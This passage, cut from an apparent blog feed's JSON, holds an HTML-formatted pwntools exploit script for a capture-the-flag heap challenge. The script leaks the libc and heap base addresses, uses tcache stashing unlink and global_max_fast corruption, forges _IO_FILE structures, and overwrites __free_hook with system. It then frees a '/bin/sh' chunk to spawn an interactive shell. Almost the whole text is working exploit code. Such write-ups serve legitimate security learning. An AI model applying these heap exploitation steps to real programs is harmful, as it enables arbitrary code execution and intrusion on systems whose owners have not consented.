function\">edit</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">,</span>content<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>\tio<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">'>> '</span><span class=\"token punctuation\">,</span><span class=\"token string\">'3'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>\tio<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">'index: '</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>\tio<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span><span class=\"token string\">'content: '</span><span class=\"token punctuation\">,</span>content<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>\t</pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">show</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>\tio<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">'>> '</span><span class=\"token punctuation\">,</span><span class=\"token string\">'4'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>\tio<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">'index: '</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>\t</pre></td></tr><tr><td data-num=\"24\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">exp</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>\t<span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>\t\tadd<span class=\"token punctuation\">(</span><span class=\"token number\">0x1f8</span><span class=\"token punctuation\">)</span><span class=\"token comment\">#0~3</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>\t<span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>\t\tadd<span class=\"token punctuation\">(</span><span class=\"token number\">0xe8</span><span class=\"token punctuation\">)</span><span class=\"token comment\">#4~5</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>\t<span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">6</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>\t\tdele<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>\t\tedit<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">,</span><span class=\"token string\">'\\x00'</span><span class=\"token operator\">*</span><span class=\"token number\">0x10</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>\t<span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">7</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>\t\tdele<span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>\t\tedit<span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">,</span><span class=\"token string\">'\\x00'</span><span class=\"token operator\">*</span><span class=\"token number\">0x10</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>\t</pre></td></tr><tr><td data-num=\"36\"></td><td><pre>\tdele<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>\tdele<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>\tshow<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>\tio<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">'ent: '</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>\tlibc_base<span class=\"token operator\">=</span>u64<span class=\"token punctuation\">(</span>io<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token number\">6</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token string\">'\\x00\\x00'</span><span class=\"token punctuation\">)</span><span class=\"token operator\">-</span>libc<span class=\"token punctuation\">.</span>symbols<span class=\"token punctuation\">[</span><span class=\"token string\">'__malloc_hook'</span><span class=\"token punctuation\">]</span><span class=\"token operator\">-</span><span class=\"token number\">96</span><span class=\"token operator\">-</span><span class=\"token number\">16</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>\tbinsh<span class=\"token operator\">=</span>libc_base<span class=\"token operator\">+</span>libc<span class=\"token punctuation\">.</span>search<span class=\"token punctuation\">(</span><span class=\"token string\">'/bin/sh'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">next</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>\tsystem<span class=\"token operator\">=</span>libc_base<span class=\"token operator\">+</span>libc<span class=\"token punctuation\">.</span>symbols<span class=\"token punctuation\">[</span><span class=\"token string\">'system'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>\tfree_hook<span class=\"token operator\">=</span>libc_base<span class=\"token operator\">+</span>libc<span class=\"token punctuation\">.</span>symbols<span class=\"token punctuation\">[</span><span class=\"token string\">'__free_hook'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>\tglobal_max_fast<span class=\"token operator\">=</span>libc_base<span class=\"token operator\">+</span><span class=\"token number\">0x1eeb80</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>\t<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'libc_base'</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>libc_base<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>\t</pre></td></tr><tr><td data-num=\"47\"></td><td><pre>\tshow<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>\tio<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">'ent: '</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>\theap_base<span class=\"token operator\">=</span>u64<span class=\"token punctuation\">(</span>io<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token number\">6</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span><span class=\"token string\">'\\x00'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token number\">0x110</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>\t<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'heap_base'</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>heap_base<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre>\t</pre></td></tr><tr><td data-num=\"52\"></td><td><pre>\tadd<span class=\"token punctuation\">(</span><span class=\"token number\">0x108</span><span class=\"token punctuation\">)</span><span class=\"token comment\">#6</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre>\tadd<span class=\"token punctuation\">(</span><span class=\"token number\">0x108</span><span class=\"token punctuation\">)</span><span class=\"token comment\">#7</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre>\tadd<span class=\"token punctuation\">(</span><span class=\"token number\">0x108</span><span class=\"token punctuation\">)</span><span class=\"token comment\">#8</span></pre></td></tr><tr><td data-num=\"55\"></td><td><pre>\tedit<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span><span class=\"token string\">'\\x00'</span><span class=\"token operator\">*</span><span class=\"token number\">0x108</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0xf1</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>heap_base<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>libc_base<span class=\"token operator\">+</span><span class=\"token number\">0x1eeb80</span><span class=\"token operator\">-</span><span class=\"token number\">0x10</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"56\"></td><td><pre>\tadd<span class=\"token punctuation\">(</span><span class=\"token number\">0xe8</span><span class=\"token punctuation\">)</span><span class=\"token comment\">#9</span></pre></td></tr><tr><td data-num=\"57\"></td><td><pre>\t<span class=\"token comment\">#tcache_stashing_unlink over</span></pre></td></tr><tr><td data-num=\"58\"></td><td><pre>\t</pre></td></tr><tr><td data-num=\"59\"></td><td><pre>\tdele<span class=\"token punctuation\">(</span><span class=\"token number\">5</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"60\"></td><td><pre>\tedit<span class=\"token punctuation\">(</span><span class=\"token number\">5</span><span class=\"token punctuation\">,</span>p64<span class=\"token punctuation\">(</span>libc_base<span class=\"token operator\">+</span>libc<span class=\"token punctuation\">.</span>symbols<span class=\"token punctuation\">[</span><span class=\"token string\">'_IO_2_1_stderr_'</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token number\">0x90</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"61\"></td><td><pre>\tadd<span class=\"token punctuation\">(</span><span class=\"token number\">0xe8</span><span class=\"token punctuation\">)</span><span class=\"token comment\">#10</span></pre></td></tr><tr><td data-num=\"62\"></td><td><pre>\tadd<span class=\"token punctuation\">(</span><span class=\"token number\">0xe8</span><span class=\"token punctuation\">)</span><span class=\"token comment\">#11</span></pre></td></tr><tr><td data-num=\"63\"></td><td><pre>\tedit<span class=\"token punctuation\">(</span><span class=\"token number\">11</span><span class=\"token punctuation\">,</span><span class=\"token string\">'\\x00'</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x20f</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"64\"></td><td><pre>\tdele<span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"65\"></td><td><pre>\tedit<span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">,</span>p64<span class=\"token punctuation\">(</span>libc_base<span class=\"token operator\">+</span>libc<span class=\"token punctuation\">.</span>symbols<span class=\"token punctuation\">[</span><span class=\"token string\">'_IO_2_1_stderr_'</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token number\">0xa0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"66\"></td><td><pre>\tadd<span class=\"token punctuation\">(</span><span class=\"token number\">0x1f8</span><span class=\"token punctuation\">)</span><span class=\"token comment\">#12</span></pre></td></tr><tr><td data-num=\"67\"></td><td><pre>\tadd<span class=\"token punctuation\">(</span><span class=\"token number\">0x1f8</span><span class=\"token punctuation\">)</span><span class=\"token comment\">#13</span></pre></td></tr><tr><td data-num=\"68\"></td><td><pre>\t</pre></td></tr><tr><td data-num=\"69\"></td><td><pre>\tpayload<span class=\"token operator\">=</span><span class=\"token string\">'\\x00'</span><span class=\"token operator\">*</span><span class=\"token number\">0x28</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>libc<span class=\"token punctuation\">.</span>symbols<span class=\"token punctuation\">[</span><span class=\"token string\">'_IO_file_jumps'</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span>libc_base<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"70\"></td><td><pre>\tpayload<span class=\"token operator\">+=</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0xfbad2887</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>libc_base<span class=\"token operator\">+</span>libc<span class=\"token punctuation\">.</span>symbols<span class=\"token punctuation\">[</span><span class=\"token string\">'_IO_2_1_stdout_'</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token number\">131</span><span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token number\">7</span></pre></td></tr><tr><td data-num=\"71\"></td><td><pre>\tpayload<span class=\"token operator\">+=</span>p64<span class=\"token punctuation\">(</span>libc_base<span class=\"token operator\">+</span>libc<span class=\"token punctuation\">.</span>symbols<span class=\"token punctuation\">[</span><span class=\"token string\">'_IO_2_1_stdout_'</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token number\">132</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token number\">4</span></pre></td></tr><tr><td data-num=\"72\"></td><td><pre>\tpayload<span class=\"token operator\">+=</span>p64<span class=\"token punctuation\">(</span>libc_base<span class=\"token operator\">+</span>libc<span class=\"token punctuation\">.</span>symbols<span class=\"token punctuation\">[</span><span class=\"token string\">'_IO_2_1_stdin_'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token string\">'\\xff'</span><span class=\"token operator\">*</span><span class=\"token number\">8</span></pre></td></tr><tr><td data-num=\"73\"></td><td><pre>\tpayload<span class=\"token operator\">+=</span><span class=\"token string\">'\\x00'</span><span class=\"token operator\">*</span><span class=\"token number\">3</span><span class=\"token operator\">+</span><span class=\"token string\">'\\x0a'</span><span class=\"token operator\">+</span>p32<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>libc_base<span class=\"token operator\">+</span><span class=\"token number\">0x1ee4c0</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"74\"></td><td><pre>\tpayload<span class=\"token operator\">+=</span><span class=\"token string\">'\\xff'</span><span class=\"token operator\">*</span><span class=\"token number\">8</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>libc_base<span class=\"token operator\">+</span><span class=\"token number\">0x1eb880</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token number\">3</span></pre></td></tr><tr><td data-num=\"75\"></td><td><pre>\tpayload<span class=\"token operator\">+=</span><span class=\"token string\">'\\xff'</span><span class=\"token operator\">*</span><span class=\"token number\">4</span><span class=\"token operator\">+</span><span class=\"token string\">'\\x00'</span><span class=\"token operator\">*</span><span class=\"token number\">0x14</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>libc_base<span class=\"token operator\">+</span>libc<span class=\"token punctuation\">.</span>symbols<span class=\"token punctuation\">[</span><span class=\"token string\">'_IO_file_jumps'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"76\"></td><td><pre>\tpayload<span class=\"token operator\">+=</span>p64<span class=\"token punctuation\">(</span>libc_base<span class=\"token operator\">+</span>libc<span class=\"token punctuation\">.</span>symbols<span class=\"token punctuation\">[</span><span class=\"token string\">'_IO_2_1_stderr_'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>libc_base<span class=\"token operator\">+</span>libc<span class=\"token punctuation\">.</span>symbols<span class=\"token punctuation\">[</span><span class=\"token string\">'_IO_2_1_stdout_'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"77\"></td><td><pre>\tpayload<span class=\"token operator\">+=</span>p64<span class=\"token punctuation\">(</span>libc_base<span class=\"token operator\">+</span>libc<span class=\"token punctuation\">.</span>symbols<span class=\"token punctuation\">[</span><span class=\"token string\">'_IO_2_1_stdin_'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"78\"></td><td><pre>\tpayload<span class=\"token operator\">+=</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"79\"></td><td><pre>\tpayload<span class=\"token operator\">=</span>payload<span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">0x1f0</span><span class=\"token punctuation\">,</span><span class=\"token string\">'\\x00'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"80\"></td><td><pre>\tpayload<span class=\"token operator\">+=</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x20f</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"81\"></td><td><pre>\tedit<span class=\"token punctuation\">(</span><span class=\"token number\">13</span><span class=\"token punctuation\">,</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"82\"></td><td><pre>\t</pre></td></tr><tr><td data-num=\"83\"></td><td><pre>\t<span class=\"token keyword\">def</span> <span class=\"token function\">encode</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">,</span>b<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"84\"></td><td><pre>\t\toffset<span class=\"token operator\">=</span>b<span class=\"token operator\">-</span><span class=\"token number\">0x7f0b79060000</span></pre></td></tr><tr><td data-num=\"85\"></td><td><pre>\t\tc<span class=\"token operator\">=</span><span class=\"token string\">''</span></pre></td></tr><tr><td data-num=\"86\"></td><td><pre>\t\t<span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x1f</span><span class=\"token operator\">*</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"87\"></td><td><pre>\t\t\t<span class=\"token keyword\">if</span> u64<span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">[</span>i<span class=\"token operator\">*</span><span class=\"token number\">8</span><span class=\"token punctuation\">:</span>i<span class=\"token operator\">*</span><span class=\"token number\">8</span><span class=\"token operator\">+</span><span class=\"token number\">8</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token operator\">></span><span class=\"token number\">0x7f0000000000</span> <span class=\"token keyword\">and</span> u64<span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">[</span>i<span class=\"token operator\">*</span><span class=\"token number\">8</span><span class=\"token punctuation\">:</span>i<span class=\"token operator\">*</span><span class=\"token number\">8</span><span class=\"token operator\">+</span><span class=\"token number\">8</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&lt;</span><span class=\"token number\">0x800000000000</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"88\"></td><td><pre>\t\t\t\tc<span class=\"token operator\">+=</span>p64<span class=\"token punctuation\">(</span>u64<span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">[</span>i<span class=\"token operator\">*</span><span class=\"token number\">8</span><span class=\"token punctuation\">:</span>i<span class=\"token operator\">*</span><span class=\"token number\">8</span><span class=\"token operator\">+</span><span class=\"token number\">8</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>offset<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"89\"></td><td><pre>\t\t\t<span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"90\"></td><td><pre>\t\t\t\tc<span class=\"token operator\">+=</span>p64<span class=\"token punctuation\">(</span>u64<span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">[</span>i<span class=\"token operator\">*</span><span class=\"token number\">8</span><span class=\"token punctuation\">:</span>i<span class=\"token operator\">*</span><span class=\"token number\">8</span><span class=\"token operator\">+</span><span class=\"token number\">8</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"91\"></td><td><pre>\t\t<span class=\"token keyword\">return</span> c</pre></td></tr><tr><td data-num=\"92\"></td><td><pre>\t</pre></td></tr><tr><td data-num=\"93\"></td><td><pre>\tfd<span class=\"token operator\">=</span><span class=\"token builtin\">open</span><span class=\"token punctuation\">(</span><span class=\"token string\">'./2'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'r'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"94\"></td><td><pre>\t</pre></td></tr><tr><td data-num=\"95\"></td><td><pre>\t<span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x11</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"96\"></td><td><pre>\t\tdele<span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"97\"></td><td><pre>\t\tedit<span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">,</span>p64<span class=\"token punctuation\">(</span>libc_base<span class=\"token operator\">+</span>libc<span class=\"token punctuation\">.</span>symbols<span class=\"token punctuation\">[</span><span class=\"token string\">'_IO_2_1_stderr_'</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token number\">0xa0</span><span class=\"token operator\">+</span><span class=\"token number\">0x1f8</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>i<span class=\"token operator\">+</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"98\"></td><td><pre>\t\tadd<span class=\"token punctuation\">(</span><span class=\"token number\">0x1f8</span><span class=\"token punctuation\">)</span><span class=\"token comment\">#14~15\\</span></pre></td></tr><tr><td data-num=\"99\"></td><td><pre>\t\tadd<span class=\"token punctuation\">(</span><span class=\"token number\">0x1f8</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"100\"></td><td><pre>\t\tpayload<span class=\"token operator\">=</span>fd<span class=\"token punctuation\">.</span>read<span class=\"token punctuation\">(</span><span class=\"token number\">0x1f0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">0x1f0</span><span class=\"token punctuation\">,</span><span class=\"token string\">'a'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"101\"></td><td><pre>\t\tfd<span class=\"token punctuation\">.</span>read<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"102\"></td><td><pre>\t\tpayload<span class=\"token operator\">=</span>encode<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">,</span>libc_base<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"103\"></td><td><pre>\t\tpayload<span class=\"token operator\">+=</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x20f</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"104\"></td><td><pre>\t\tedit<span class=\"token punctuation\">(</span><span class=\"token number\">15</span><span class=\"token operator\">+</span>i<span class=\"token operator\">*</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"105\"></td><td><pre>\t</pre></td></tr><tr><td data-num=\"106\"></td><td><pre>\tdele<span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"107\"></td><td><pre>\tedit<span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">,</span>p64<span class=\"token punctuation\">(</span>libc_base<span class=\"token operator\">+</span>libc<span class=\"token punctuation\">.</span>symbols<span class=\"token punctuation\">[</span><span class=\"token string\">'_IO_2_1_stderr_'</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token number\">0xa0</span><span class=\"token operator\">+</span><span class=\"token number\">0x1f8</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>i<span class=\"token operator\">+</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"108\"></td><td><pre>\tadd<span class=\"token punctuation\">(</span><span class=\"token number\">0x1f8</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"109\"></td><td><pre>\tadd<span class=\"token punctuation\">(</span><span class=\"token number\">0x1f8</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"110\"></td><td><pre>\tgdb<span class=\"token punctuation\">.</span>attach<span class=\"token punctuation\">(</span>io<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"111\"></td><td><pre>\tpayload<span class=\"token operator\">=</span><span class=\"token string\">'\\x00'</span><span class=\"token operator\">*</span><span class=\"token number\">0x148</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>system<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"112\"></td><td><pre>\tedit<span class=\"token punctuation\">(</span><span class=\"token number\">15</span><span class=\"token operator\">+</span>i<span class=\"token operator\">*</span><span class=\"token number\">2</span><span class=\"token operator\">+</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"113\"></td><td><pre>\tedit<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token string\">'/bin/sh\\x00'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"114\"></td><td><pre>\tdele<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"115\"></td><td><pre></pre></td></tr><tr><td data-num=\"116\"></td><td><pre>\tio<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"117\"></td><td><pre>exp<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure>",
            "tags": []
        },
        {
            "id": "https://zephyr-cyber.github.io.git/pwn/",
            "url": "https://zephyr-cyber.github.io.git/pwn/",
            "title": "pwn学习(1)",
            "date_published": "2022-09-16T14:18:59.152Z",
